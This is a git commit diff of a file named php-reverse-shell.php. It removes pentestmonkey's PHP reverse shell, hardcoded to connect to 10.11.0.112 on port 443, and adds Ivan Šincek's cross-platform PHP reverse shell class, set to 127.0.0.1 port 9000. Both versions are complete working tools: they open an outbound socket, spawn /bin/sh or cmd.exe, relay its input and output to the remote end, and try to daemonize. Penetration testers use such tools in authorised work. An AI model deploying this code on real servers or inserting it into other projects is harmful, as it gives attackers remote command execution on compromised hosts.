e66165f5c0d877e6aebd7669e0d092cc79fa4df7
puckie <57447087+puckiestyle@users.noreply.github.com>
2024-10-29 14:24:31 +0100

    Add files via upload

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -1,192 +1,183 @@
 <?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+// Copyright (c) 2020 Ivan Šincek
+// v2.6
+// Requires PHP v5.0.0 or greater.
+// Works on Linux OS, macOS, and Windows OS.
+// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
+class Shell {
+    private $addr  = null;
+    private $port  = null;
+    private $os    = null;
+    private $shell = null;
+    private $descriptorspec = array(
+        0 => array('pipe', 'r'), // shell can read from STDIN
+        1 => array('pipe', 'w'), // shell can write to STDOUT
+        2 => array('pipe', 'w')  // shell can write to STDERR
+    );
+    private $buffer = 1024;  // read/write buffer size
+    private $clen   = 0;     // command length
+    private $error  = false; // stream read/write error
+    private $sdump  = true;  // script's dump
+    public function __construct($addr, $port) {
+        $this->addr = $addr;
+        $this->port = $port;
+    }
+    private function detect() {
+        $detected = true;
+        $os = PHP_OS;
+        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
+            $this->os    = 'LINUX';
+            $this->shell = '/bin/sh';
+        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
+            $this->os    = 'WINDOWS';
+            $this->shell = 'cmd.exe';
+        } else {
+            $detected = false;
+            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
+        }
+        return $detected;
+    }
+    private function daemonize() {
+        $exit = false;
+        if (!function_exists('pcntl_fork')) {
+            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
+        } else if (($pid = @pcntl_fork()) < 0) {
+            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
+        } else if ($pid > 0) {
+            $exit = true;
+            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
+            // once daemonized, you will actually no longer see the script's dump
+        } else if (posix_setsid() < 0) {
+            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
+        } else {
+            echo "DAEMONIZE: Completed successfully!\n";
+        }
+        return $exit;
+    }
+    private function settings() {
+        @error_reporting(0);
+        @set_time_limit(0); // do not impose the script execution time limit
+        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
+    }
+    private function dump($data) {
+        if ($this->sdump) {
+            $data = str_replace('<', '&lt;', $data);
+            $data = str_replace('>', '&gt;', $data);
+            echo $data;
+        }
+    }
+    private function read($stream, $name, $buffer) {
+        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
+            $this->error = true;                            // set the global error flag
+            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
+        }
+        return $data;
+    }
+    private function write($stream, $name, $data) {
+        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
+            $this->error = true;                            // set the global error flag
+            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
+        }
+        return $bytes;
+    }
+    // read/write method for non-blocking streams
+    private function rw($input, $output, $iname, $oname) {
+        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
+            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
+            $this->dump($data); // script's dump
+        }
+    }
+    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
+    // we must read the exact byte length from a stream and not a single byte more
+    private function brw($input, $output, $iname, $oname) {
+        $size = fstat($input)['size'];
+        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
+            // for some reason Windows OS pipes STDIN into STDOUT
+            // we do not like that
+            // so we need to discard the data from the stream
+            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
+                $this->clen -= $bytes;
+                $size -= $bytes;
+            }
+        }
+        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
+            $size -= $bytes;
+            $this->dump($data); // script's dump
+        }
+    }
+    public function run() {
+        if ($this->detect() && !$this->daemonize()) {
+            $this->settings();
 
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '10.11.0.112';  // CHANGE THIS
-$port = 443;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
+            // ----- SOCKET BEGIN -----
+            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
+            if (!$socket) {
+                echo "SOC_ERROR: {$errno}: {$errstr}\n";
+            } else {
+                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS
 
-//
-// Daemonise ourself if possible to avoid zombies later
-//
+                // ----- SHELL BEGIN -----
+                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
+                if (!$process) {
+                    echo "PROC_ERROR: Cannot start the shell\n";
+                } else {
+                    foreach ($pipes as $pipe) {
+                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
+                    }
 
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
-if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  // Parent exits
-	}
+                    // ----- WORK BEGIN -----
+                    $status = proc_get_status($process);
+                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
+                    do {
+                        $status = proc_get_status($process);
+                        if (feof($socket)) { // check for end-of-file on SOCKET
+                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
+                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
+                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
+                        }                                                                    // use proc_get_status() instead
+                        $streams = array(
+                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
+                            'write'  => null,
+                            'except' => null
+                        );
+                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
+                        if ($num_changed_streams === false) {
+                            echo "STRM_ERROR: stream_select() failed\n"; break;
+                        } else if ($num_changed_streams > 0) {
+                            if ($this->os === 'LINUX') {
+                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
+                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
+                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
+                            } else if ($this->os === 'WINDOWS') {
+                                // order is important
+                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
+                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
+                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
+                            }
+                        }
+                    } while (!$this->error);
+                    // ------ WORK END ------
 
-	// Make the current process a session leader
-	// Will only succeed if we forked
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
+                    foreach ($pipes as $pipe) {
+                        fclose($pipe);
+                    }
+                    proc_close($process);
+                }
+                // ------ SHELL END ------
 
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+                fclose($socket);
+            }
+            // ------ SOCKET END ------
+
+        }
+    }
 }
-
-// Change to a safe directory
-chdir("/");
-
-// Remove any umask we inherited
-umask(0);
-
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
-}
-
-// Spawn shell process
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
-
-$process = proc_open($shell, $descriptorspec, $pipes);
-
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
-}
-
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
-
-printit("Successfully opened reverse shell to $ip:$port");
-
-while (1) {
-	// Check for end of TCP connection
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
-
-	// Check for end of STDOUT
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	// If we can read from the process's STDERR
-	// send data down tcp connection
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?> 
-
-
-
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('127.0.0.1', 9000);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>
